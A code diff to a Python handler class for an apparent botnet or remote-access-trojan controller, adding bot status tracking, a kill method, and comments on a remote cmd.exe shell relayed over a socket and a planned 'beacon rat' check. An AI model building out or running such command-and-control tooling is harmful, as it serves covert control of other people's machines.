@@ -24,6 +24,7 @@ class Handler(threading.Thread):
         self.port = client_address[1]
         self.bot_id = bot_id
         self.info = [self.bot_id,self.ip,self.port]
+        self.status = "ALIVE"
 
     def run(self):
 
@@ -49,23 +50,25 @@ class Handler(threading.Thread):
     #     print(f"\n[*BotHandler-Msg] Deactivating {str(self.bot_id)}...")
     #     self.isActive = False
 
-    # def kill(self):     # hah
-    #     print(f"\n[*BotHandler-Msg] Killing connection for Bot {str(self.bot_id)}...")
-    #     self.execute("exit")
+    def kill(self):     # hah
+        print(f"\n[*BotHandler-Msg] Severing connection for Bot {str(self.bot_id)}...")
+        self.execute("exit")
 
-    #     # Record information into deadConnections[]
-    #     deadConnections.append(self.info)           # Append the info so the thread can join the main thread
-    #     aliveConnections.remove(self)               # Remove the Handler-thread from the Alives array
+        # Record information into deadConnections[]
+        # deadConnections.append(self.info)             # Append the info so the thread can join the main thread
+        agentList.remove(self)                          # Remove the Handler-thread from the Alives array
+
+        print(f"\n[*BotHandler-Msg] Killing thread for BotHandler {str(self.bot_id)}...")
+        if(threading.current_thread().is_alive()):
+            threading.current_thread().join
 
 
-    #     print(f"\n[*BotHandler-Msg] Killing thread for BotHandler {str(self.bot_id)}...")
-    #     # if(threading.current_thread().is_alive()):
-    #     #     threading.current_thread().join
-
-
-    def isAlive(self):
-        return self.isAlive
+    def getStatus(self):
+        return self.status
     
+    def setStatus(self, stat):
+        self.status = stat
+
     def getInfo(self):
         return self.info
 
@@ -83,7 +86,6 @@ class Handler(threading.Thread):
 
     def shell(self):
 
-        
         # if command is 'shell':
         #   we send the shell keyword, which initiates the cmd.exe, and then redirects all stdin/out to the socket
         #   the shell will still be receiving any information we send it, therefore thats why it closed only the cmd.exe session when we subsequently exited.
@@ -93,7 +95,9 @@ class Handler(threading.Thread):
         #--------
         # Current problem:
         #   Data from cmd.exe shell is hanging. I have to initially receive the welcome-msg twice (once for the Microsoft 
-        #   banner and another for the initial shell/cwd output prompt). After that, 
+        #   banner and another for the initial shell/cwd output prompt).
+        
+        # Problem solved. The commands no longer hang, but 
 
         # Initiate shell 
         try:
@@ -172,8 +176,13 @@ class Handler(threading.Thread):
             # print(f"[* BotHandler-Msg] Using beacon verification to test if host is still up...")
             # if(!beacon(bot_id)):
             #   <Kill connection, join the thread, ad to list of dead bots>
-    
 
+    def beacon(self):
+        # Ping host 
+        #   if no reply, Kill host connection
+        #
+        # beacon rat
+        #   if no reply, set host status to LOST
 
     # TODO %%
     def download(self, remotepath, localfile):
